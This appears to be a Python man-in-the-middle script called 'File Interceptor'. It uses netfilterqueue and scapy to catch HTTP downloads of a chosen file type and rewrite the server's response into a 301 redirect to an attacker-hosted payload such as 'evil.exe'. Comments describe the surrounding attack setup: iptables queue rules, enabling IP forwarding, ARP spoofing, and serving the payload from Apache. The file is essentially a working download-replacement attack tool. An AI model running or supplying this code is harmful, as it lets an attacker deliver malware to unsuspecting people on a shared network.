#!/usr/bin/env python

import argparse
import netfilterqueue
import scapy.all as scapy

list_ack = []

def do_packet_process(packet):
    ## Referenced from dns-spoofer
    obj_packet_scapy = scapy.IP(packet.get_payload())
    if obj_packet_scapy.haslayer(scapy.Raw) and obj_packet_scapy.haslayer(scapy.TCP):
        ## HTTP Request/Response Criteria
        ## If Source Port (sport) is 42846 (tcp/udp) and Destination Port (dport) is http (80) => Request
        ## If Source Port (sport) is http (80) and Destination Port (dport) is 42846 (tcp/udp) => Response
        ## Check if TCP dport (Destination Port) is HTTP, hence request
        
        if obj_packet_scapy[scapy.TCP].dport == 80:
            print("ℹ️  HTTP Request")
            if obj_options.ext in obj_packet_scapy[scapy.Raw].load.decode():
                print("🔔 CUSTOM PAYLOAD EXTENSION (" + obj_options.ext + ") REQUEST FOUND")
                ## Adds the ack field in the list
                list_ack.append(obj_packet_scapy[scapy.TCP].ack)
                print(obj_packet_scapy.show())
                print(list_ack)
        ## Check if TCP dport (Destination Port) is HTTP, hence response 
        elif obj_packet_scapy[scapy.TCP].sport == 80:
            print("ℹ️  HTTP Response")
            
            if obj_packet_scapy[scapy.TCP].seq in list_ack:
                list_ack.remove(obj_packet_scapy[scapy.TCP].seq)
                print("ℹ️ Replacing File")
                ## Set a customized 301 Payload. Template was based from the references
                ## In linux: /var/www/html/<dir>/<Evil File.exe> => http://<Attacker IP>//<dir>/<Evil File.exe>
                ## Change the URL to your payload
                ## Reference https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
                ## Reference https://en.wikipedia.org/wiki/HTTP_301
                ## \n\n suffix was added to ensure extra characters will not interfere with the process
                # obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: https://www.7-zip.org/a/7z2301-x64.exe\n\n")
                # obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: " + "http://192.168.1.6/evil.exe" + "\n\n")
                obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: " + obj_options.payload + "\n\n")
                packet.set_payload(bytes(obj_packet_mod))
                
                
    ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
    packet.accept()
    # packet.drop()

def do_payload_set(obj_packet, str_payload):
    # print(packet.show())
    obj_packet[scapy.Raw].load = str_payload
    ## Deleting Checksums and length properties to let network refresh values and bypass checking
    del obj_packet[scapy.IP].chksum
    del obj_packet[scapy.IP].len
    del obj_packet[scapy.TCP].chksum
    return obj_packet

def get_arguments():
    obj_parser = argparse.ArgumentParser(
        prog='File Interceptor',
        description='Intercepts Payload via MITM.',
        epilog='Tested in http://www.speedbit.com/ and Windows Server'
    )
    obj_parser.add_argument("-e", "--extension", dest="ext", help="Extension of the expected payload (E.g. .exe, .rar, .zip)", required=True)
    obj_parser.add_argument("-p", "--payload", dest="payload", help="Payload file Absolute Path (E.g. http://192.168.1.6/evil.exe https://www.7-zip.org/a/7z2301-x64.exe)", required=True)
    options = obj_parser.parse_args()
    return options

## Set the Apache Server if you're running test machines
## Linux: service apache2 start

## Create an iptables Queue
## Terminal: iptables --flush
## Terminal: iptables -I FORWARD -j NFQUEUE # Working at latest version. Default queue-num is 0 <<< USE THIS FOR HTTP 301
## Terminal: iptables -I INPUT -j NFQUEUE # Working at latest version. Default queue-num is 0
## Terminal: iptables -I INPUT -j NFQUEUE --queue-num 0 
## Terminal: iptables -I OUTPUT -j NFQUEUE # Working at latest version. Default queue-num is 0
## Terminal: iptables -I OUTPUT -j NFQUEUE --queue-num 0

## Start arp-spoofer

## Start Packet Forwarding
## Linux: echo 1 > /proc/sys/net/ipv4/ip_forward

## Test a Download Website (HTTP)
## E.g. http://www.speedbit.com/

## Try-Catch was used to enable keyboard exception handling
try:
    obj_options = get_arguments()
    obj_queue = netfilterqueue.NetfilterQueue()
    ## Bind this object/class to the Terminal iptables Queue
    obj_queue.bind(0, do_packet_process)
    obj_queue.run()
except KeyboardInterrupt:
    print("\n" + "☒ Detected KeyboardInterrupt... Goodbye")
    exit()
